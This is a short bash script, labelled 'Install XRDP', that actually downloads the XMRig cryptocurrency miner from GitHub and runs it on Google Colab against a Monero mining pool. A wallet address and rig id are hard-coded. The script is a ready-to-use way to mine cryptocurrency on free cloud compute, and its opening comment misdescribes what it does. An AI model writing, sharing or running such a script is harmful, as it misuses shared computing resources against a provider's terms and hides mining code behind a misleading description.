#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 86YpJLSXK3873T9jLTstg1aa4pLNZqVnfJfTTUGMyiYMWdWh2Ld2zc8VSu9PnQSstUAef1mJ3beXy7Rmm1diGNhDJmmKWNu -k --tls --rig-id GC-US
